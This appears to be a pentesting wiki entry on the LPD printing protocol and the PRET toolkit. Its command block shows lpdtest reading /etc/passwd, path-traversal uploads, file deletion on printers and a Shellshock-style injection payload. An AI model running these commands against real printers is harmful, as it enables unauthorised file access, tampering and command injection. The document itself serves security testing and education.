The daemon runs on port 515/tcp and can be accessed using the `lpr`command. To print, the client sends a **control file** defining job/username and a **data file** containing the actual data to be printed. The **input type** of the data file can be set in the control file by choosing among **various file formats**. However it is up to the LPD implementation how to actually handle the print data. A popular LPD implementation for Unix-like operating system is LPRng. LPD can be used as a carrier to deploy **malicious PostScript** or **PJL print jobs**.

The `lpdprint` and `lpdtest` tools are included in [**PRET**](https://github.com/RUB-NDS/PRET)**.** They are a minimalist way to print data directly to an LPD capable printer or download/upload/delete files and more:

```
lpdprint.py hostname filename
lpdtest.py hostname get /etc/passwd
lpdtest.py hostname put ../../etc/passwd
lpdtest.py hostname rm /some/file/on/printer
lpdtest.py hostname in '() {:;}; ping -c1 1.2.3.4'
lpdtest.py hostname mail lpdtest@mailhost.local
```
